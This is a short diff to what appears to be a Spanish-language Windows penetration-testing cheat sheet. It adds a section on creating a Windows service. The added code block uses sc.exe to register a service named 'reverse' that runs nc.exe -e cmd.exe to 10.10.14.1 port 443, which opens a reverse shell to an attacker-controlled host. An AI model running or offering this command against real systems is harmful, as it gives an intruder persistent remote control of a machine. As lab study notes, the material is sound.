@@ -1718,7 +1718,11 @@ Para ver los servicios usa:
 services # PS Get-Service
 
 ```
+Para crear una servicio en windows
 
+```
+sc.exe create reverse binPath="C:\Users\svc-printer\Desktop\nc.exe -e cmd.exe 10.10.14.1 443"
+```
 
 ## Exploits de windows
 
